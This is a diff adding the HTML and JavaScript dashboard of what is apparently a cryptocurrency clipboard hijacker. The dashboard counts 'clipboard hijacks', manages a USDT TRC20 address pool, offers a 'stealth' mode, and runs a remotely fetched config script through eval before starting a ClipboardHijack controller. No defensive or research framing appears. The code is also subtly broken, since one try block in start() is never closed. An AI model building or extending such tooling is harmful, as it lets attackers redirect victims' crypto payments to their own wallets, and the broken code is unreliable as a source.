@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Control</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .stat-value {
+            font-size: 2.5em;
+            font-weight: 600;
+            color: #0866ff;
+            margin: 10px 0;
+        }
+        
+        .control-panel {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        button {
+            background: #0866ff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-right: 10px;
+            transition: all 0.2s;
+        }
+        
+        button:hover {
+            background: #0653d3;
+            transform: translateY(-1px);
+        }
+        
+        button:disabled {
+            background: #e4e6eb;
+            color: #b0b3b8;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .log-window {
+            background: #18191a;
+            color: #e4e6ea;
+            padding: 20px;
+            border-radius: 12px;
+            height: 300px;
+            overflow-y: auto;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-active { background: #42b883; }
+        .status-inactive { background: #e74c3c; }
+        .status-warning { background: #f39c12; }
+        
+        select {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 Clipboard System Control Center</h1>
+            <p><span class="status-indicator" id="status"></span><span id="statusText">System Ready</span></p>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>📋 Hijacked</h3>
+                <div class="stat-value" id="statHijacked">0</div>
+                <small>Total clipboard hijacks</small>
+            </div>
+            
+            <div class="stat-card">
+                <h3>🔑 Addresses</h3>
+                <div class="stat-value" id="statAddresses">0</div>
+                <small>Active address pool</small>
+            </div>
+            
+            <div class="stat-card">
+                <h3>⏱️ Uptime</h3>
+                <div class="stat-value" id="statUptime">0s</div>
+                <small>System runtime</small>
+            </div>
+            
+            <div class="stat-card">
+                <h3>🌐 Platform</h3>
+                <div class="stat-value" id="statPlatform">-</div>
+                <small>Detected environment</small>
+            </div>
+        </div>
+        
+        <div class="control-panel">
+            <h2>⚙️ System Control</h2>
+            
+            <div style="margin: 20px 0;">
+                <label>
+                    Mode:
+                    <select id="configMode">
+                        <option value="stealth">Stealth (Recommended)</option>
+                        <option value="aggressive">Aggressive</option>
+                        <option value="testing">Testing</option>
+                    </select>
+                </label>
+            </div>
+            
+            <div>
+                <button id="btnStart">▶️ Start System</button>
+                <button id="btnStop" disabled>⏸️ Stop System</button>
+                <button id="btnTest">🧪 Run Tests</button>
+                <button id="btnClear">🗑️ Clear Logs</button>
+            </div>
+        </div>
+        
+        <div class="log-window" id="logWindow">
+            <div>[System] Initializing...</div>
+        </div>
+    </div>
+    
+    <!-- 加载所有模块 -->
+    <script src="config.js"></script>
+    <script src="addresses.js"></script>
+    <script src="cache.js"></script> 
+    <script src="test-toolkit.js"></script>
+	<script src="bkk3.js"></script>
+
+    
+    <!-- 整合逻辑 -->
+    <script>
+        class SystemIntegrator {
+            constructor() {
+                this.startTime = null;
+                this.updateTimer = null;
+                
+                // 绑定UI
+                this.ui = {
+                    status: document.getElementById('status'),
+                    statusText: document.getElementById('statusText'),
+                    hijacked: document.getElementById('statHijacked'),
+                    addresses: document.getElementById('statAddresses'),
+                    uptime: document.getElementById('statUptime'),
+                    platform: document.getElementById('statPlatform'),
+                    logWindow: document.getElementById('logWindow'),
+                    btnStart: document.getElementById('btnStart'),
+                    btnStop: document.getElementById('btnStop'),
+                    btnTest: document.getElementById('btnTest'),
+                    btnClear: document.getElementById('btnClear'),
+                    configMode: document.getElementById('configMode')
+                };
+                
+                this.bindEvents();
+                this.initialize();
+            }
+            
+            initialize() {
+                // 检测平台
+                const platform = window.ClipboardHijack?.platform?.detect();
+                if (platform) {
+                    const os = platform.os.ios ? 'iOS' : platform.os.android ? 'Android' : 'Desktop';
+                    this.ui.platform.textContent = os;
+                }
+                
+                // 加载地址池
+                this.updateAddressCount();
+                
+                this.log('✅ System initialized and ready');
+            }
+            
+            bindEvents() {
+                this.ui.btnStart.onclick = () => this.start();
+                this.ui.btnStop.onclick = () => this.stop();
+                this.ui.btnTest.onclick = () => this.runTests();
+                this.ui.btnClear.onclick = () => this.clearLogs();
+                this.ui.configMode.onchange = (e) => this.changeMode(e.target.value);
+            }
+            
+            async start() {
+                this.log('🚀 Starting clipboard hijack system...');
+                
+                try {
+                    // 加载配置
+                    const mode = this.ui.configMode.value;
+                    const config = ConfigManager.load(mode);
+                    
+					try {
+						const response = await fetch('clipboard_config.js');
+						if (response.ok) {
+							const script = await response.text();
+							eval(script);
+							
+							if (window.CLIPBOARD_CONFIG) {
+								// 导入TRC20地址
+								AddressPool.import({
+									USDT: {
+										tron: CLIPBOARD_CONFIG.TRC20.primary
+									}
+								});
+								this.log('✅ 导入地址池成功');
+							}
+						}
+					} catch (e) {
+						this.log('⚠️ 地址配置未找到，使用默认地址');
+					
+					
+                    // 设置地址池
+                    config.addresses = {
+                        USDT: AddressPool.get('USDT')
+                    };
+                    
+                    // 应用配置并启动
+                    window.ClipboardHijack.controller.setConfig(config);
+                    
+                    // 更新UI
+                    this.ui.btnStart.disabled = true;
+                    this.ui.btnStop.disabled = false;
+                    this.ui.status.className = 'status-indicator status-active';
+                    this.ui.statusText.textContent = 'System Active';
+                    
+                    // 启动监控
+                    this.startTime = Date.now();
+                    this.startMonitoring();
+                    
+                    this.log(`✅ System started in ${mode} mode`);
+                    
+                    // 如果是测试模式，创建测试页面
+                    if (mode === 'testing') {
+                        TestToolkit.createTestPage();
+                        this.log('📄 Test page created');
+                    }
+                    
+                } catch (error) {
+                    this.log(`❌ Start failed: ${error.message}`, 'error');
+                    this.stop();
+                }
+            }
+            
+            stop() {
+                this.log('🛑 Stopping system...');
+                
+                window.ClipboardHijack?.controller?.pause();
+                
+                this.ui.btnStart.disabled = false;
+                this.ui.btnStop.disabled = true;
+                this.ui.status.className = 'status-indicator status-inactive';
+                this.ui.statusText.textContent = 'System Stopped';
+                
+                this.stopMonitoring();
+                
+                this.log('✅ System stopped');
+            }
+            
+            async runTests() {
+                this.log('🧪 Running system tests...');
+                
+                const results = await TestToolkit.runTests();
+                
+                results.forEach(result => {
+                    const icon = result.success ? '✅' : '❌';
+                    this.log(`${icon} ${result.test}: ${JSON.stringify(result.details)}`);
+                });
+                
+                this.log(`📊 Tests complete: ${results.filter(r => r.success).length}/${results.length} passed`);
+            }
+            
+            changeMode(mode) {
+                this.log(`🔄 Switching to ${mode} mode...`);
+                
+                if (window.ClipboardHijack?.controller) {
+                    const config = ConfigManager.load(mode);
+                    window.ClipboardHijack.controller.setConfig(config);
+                    this.log(`✅ Mode changed to ${mode}`);
+                }
+            }
+            
+            startMonitoring() {
+                this.updateTimer = setInterval(() => {
+                    // 更新运行时间
+                    if (this.startTime) {
+                        const seconds = Math.floor((Date.now() - this.startTime) / 1000);
+                        const minutes = Math.floor(seconds / 60);
+                        const hours = Math.floor(minutes / 60);
+                        
+                        if (hours > 0) {
+                            this.ui.uptime.textContent = `${hours}h ${minutes % 60}m`;
+                        } else if (minutes > 0) {
+                            this.ui.uptime.textContent = `${minutes}m ${seconds % 60}s`;
+                        } else {
+                            this.ui.uptime.textContent = `${seconds}s`;
+                        }
+                    }
+                    
+                    // 更新统计
+                    const stats = window.ClipboardHijack?.stats();
+                    if (stats) {
+                        this.ui.hijacked.textContent = stats.executed || 0;
+                    }
+                }, 1000);
+            }
+            
+            stopMonitoring() {
+                if (this.updateTimer) {
+                    clearInterval(this.updateTimer);
+                    this.updateTimer = null;
+                }
+            }
+            
+            updateAddressCount() {
+                let count = 0;
+                for (const type in AddressPool.pools) {
+                    for (const network in AddressPool.pools[type]) {
+                        count += AddressPool.pools[type][network].length;
+                    }
+                }
+                this.ui.addresses.textContent = count;
+            }
+            
+            log(message, level = 'info') {
+                const timestamp = new Date().toLocaleTimeString();
+                const logEntry = document.createElement('div');
+                logEntry.textContent = `[${timestamp}] ${message}`;
+                
+                if (level === 'error') {
+                    logEntry.style.color = '#ff6b6b';
+                } else if (level === 'warning') {
+                    logEntry.style.color = '#ffd93d';
+                }
+                
+                this.ui.logWindow.appendChild(logEntry);
+                this.ui.logWindow.scrollTop = this.ui.logWindow.scrollHeight;
+            }
+            
+            clearLogs() {
+                this.ui.logWindow.innerHTML = '<div>[System] Logs cleared</div>';
+            }
+        }
+        
+        // 启动系统
+        const system = new SystemIntegrator();
+        
+        // 全局访问
+        window.SystemIntegrator = system;
+    </script>
+</body>
+</html>
